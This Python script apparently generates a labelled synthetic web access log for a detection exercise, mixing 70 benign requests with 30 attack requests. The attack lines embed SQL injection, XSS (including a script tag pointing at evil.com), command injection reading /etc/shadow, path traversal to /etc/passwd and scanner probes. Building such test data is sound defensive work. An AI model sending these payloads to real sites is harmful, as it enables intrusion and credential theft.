"""
generate_perfect_test_log.py
============================
Creates a clean, golden-ratio test log file (perfect_test_eval.log)
containing exactly:
- 70 Diverse Legitimate / Benign requests (static CSS/JS, root, about, contact, APIs)
- 30 Real Attacks (SQLi, XSS, Path Traversal, Command Injection, Nikto Scanner)
Total: 100 requests (70% Benign / 30% Attack).
"""

from pathlib import Path
from datetime import datetime, timedelta
import random
import urllib.parse
import pandas as pd

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# 1. 70 Diverse Benign requests
benign_endpoints = [
    ("GET", "/", 200, 4520, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/assets/css/main.css", 200, 12840, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/assets/js/bundle.min.js", 200, 48210, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/assets/images/logo.png", 200, 8430, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/favicon.ico", 200, 1150, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/about-us", 200, 5120, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/contact", 200, 3940, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("POST", "/contact/submit", 200, 450, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/faq", 200, 5800, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/privacy-policy", 200, 6210, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/search?q=wireless+headphones", 200, 6820, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/products?category=electronics&page=1", 200, 7910, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/products/view?id=4920", 200, 8200, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("POST", "/cart/add", 200, 120, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/cart/checkout", 200, 9400, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1"),
    ("GET", "/dashboard", 200, 8920, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/dashboard/analytics", 200, 14200, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/api/v1/metrics?range=24h", 200, 4890, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("POST", "/api/v1/export/csv", 200, 24800, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"),
    ("GET", "/healthz", 200, 24, "kube-probe/1.28")
]

# 2. 30 Real Attacks
attack_specs = [
    # SQL Injections (8)
    ("GET", "/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users--", 403, 280, "curl/7.88.1", "198.51.100.14"),
    ("GET", "/item.php?id=-1%27%20OR%201=1--%20", 403, 280, "curl/7.88.1", "198.51.100.14"),
    ("GET", "/api/v1/user?id=1%20AND%201=1%20UNION%20ALL%20SELECT%20NULL,version()--", 403, 240, "sqlmap/1.7#stable", "103.251.167.20"),
    ("GET", "/search?id=1%27;WAITFOR%20DELAY%20%270:0:5%27--", 403, 240, "sqlmap/1.7#stable", "103.251.167.20"),
    ("GET", "/products/search?q=1%22%20or%20%28select%20sleep(5)%29--", 403, 285, "Mozilla/5.0", "198.51.100.32"),
    ("GET", "/items?cat=admin%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--", 403, 285, "Mozilla/5.0", "198.51.100.45"),
    ("POST", "/login.php?user=admin%27%20OR%20%271%27=%271", 500, 420, "Mozilla/5.0", "198.51.100.50"),
    ("GET", "/catalog?id=105%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users),1,1))>64--", 403, 280, "Mozilla/5.0", "198.51.100.60"),

    # XSS (8)
    ("GET", "/comments?msg=%3Cscript%3Ealert(%27XSS_PWNED%27)%3C%2Fscript%3E", 400, 310, "Mozilla/5.0", "203.0.113.82"),
    ("GET", "/search?query=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E", 400, 310, "Mozilla/5.0", "203.0.113.82"),
    ("GET", "/profile?bio=%3Csvg/onload=alert(1)%3E", 400, 310, "Mozilla/5.0", "203.0.113.82"),
    ("GET", "/comment?body=%3Cbody%20onafterprint=alert(1)%3E", 400, 310, "Mozilla/5.0", "203.0.113.87"),
    ("GET", "/feed?post=%3Ciframe%20src=javascript:alert(1)%3E", 400, 310, "Mozilla/5.0", "203.0.113.88"),
    ("GET", "/review?text=%3Cscript%20src=http://evil.com/xss.js%3E%3C/script%3E", 400, 310, "Mozilla/5.0", "203.0.113.89"),
    ("POST", "/message?content=%3Ca%20href=javascript:alert(document.domain)%3Eclick%3C/a%3E", 400, 310, "Mozilla/5.0", "203.0.113.90"),
    ("GET", "/guestbook?entry=%3Cdetails/open/ontoggle=alert(1)%3E", 400, 310, "Mozilla/5.0", "203.0.113.91"),

    # Command Injection (5)
    ("POST", "/ping.php?host=127.0.0.1;%20cat%20/etc/shadow", 500, 480, "Python-urllib/3.10", "185.220.101.5"),
    ("GET", "/cgi-bin/test?cmd=127.0.0.1|whoami", 500, 480, "Python-urllib/3.10", "185.220.101.5"),
    ("GET", "/tools/diag.php?ip=127.0.0.1&&id;ls%20-la", 500, 480, "Python-urllib/3.10", "185.220.101.5"),
    ("POST", "/backup.sh?target=127.0.0.1;$(id)", 500, 480, "curl/8.1.2", "185.220.101.12"),
    ("GET", "/api/system?exec=127.0.0.1%20|%20uname%20-a", 500, 480, "curl/8.1.2", "185.220.101.15"),

    # Path Traversal (5)
    ("GET", "/download?file=../../../../../../etc/passwd", 403, 210, "curl/7.88.1", "192.0.2.77"),
    ("GET", "/view.php?path=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts", 403, 210, "curl/7.88.1", "192.0.2.77"),
    ("GET", "/include.php?doc=/var/log/apache2/access.log%00", 403, 210, "curl/7.88.1", "192.0.2.77"),
    ("GET", "/get_doc?file=....//....//....//etc/shadow", 403, 210, "curl/7.88.1", "192.0.2.78"),
    ("GET", "/export?template=../../../../../../proc/self/environ", 403, 210, "curl/7.88.1", "192.0.2.79"),

    # Scanners (4)
    ("GET", "/.env", 404, 180, "Nikto/2.1.6", "94.102.49.190"),
    ("GET", "/.git/HEAD", 404, 180, "Nikto/2.1.6", "94.102.49.190"),
    ("GET", "/wp-config.php.bak", 404, 180, "Nikto/2.1.6", "94.102.49.190"),
    ("GET", "/admin/backup.sql", 404, 180, "Nikto/2.1.6", "94.102.49.190")
]

# Generate 70 benign log lines by cycling endpoints with authentic IPs
benign_lines = []
base_time = datetime(2026, 10, 9, 10, 0, 0)
benign_ips = ["192.168.1.45", "10.0.0.88", "172.16.5.10", "192.168.1.100", "83.149.9.216"]

for i in range(70):
    m, res, status, b_val, ua = benign_endpoints[i % len(benign_endpoints)]
    ip = benign_ips[i % len(benign_ips)]
    ts = (base_time + timedelta(seconds=i * 8)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'{ip} - - [{ts}] "{m} {res} HTTP/1.1" {status} {b_val} "https://example.com/" "{ua}"'
    benign_lines.append(line)

# Generate 30 attack lines
attack_lines = []
for i, (m, res, status, b_val, ua, ip) in enumerate(attack_specs):
    ts = (base_time + timedelta(seconds=i * 18 + 5)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    line = f'{ip} - - [{ts}] "{m} {res} HTTP/1.1" {status} {b_val} "-" "{ua}"'
    attack_lines.append(line)

# Combine & shuffle
all_records = benign_lines + attack_lines
random.seed(42)
random.shuffle(all_records)

content = "\n".join(all_records) + "\n"

# Write out to workspace root & Practical 10 data
dest_root = PROJECT_ROOT / "perfect_test_eval.log"
dest_p10 = PROJECT_ROOT / "Practical 10" / "data" / "perfect_test_eval.log"

with open(dest_root, "w", encoding="utf-8") as f:
    f.write(content)

with open(dest_p10, "w", encoding="utf-8") as f:
    f.write(content)

print("[OK] Created perfect_test_eval.log successfully!")
print(f"Total Requests: {len(all_records)}")
print(f"Benign Requests: {len(benign_lines)} (70.0%)")
print(f"Attack Requests: {len(attack_lines)} (30.0%)")
print(f"Saved to: {dest_root}")
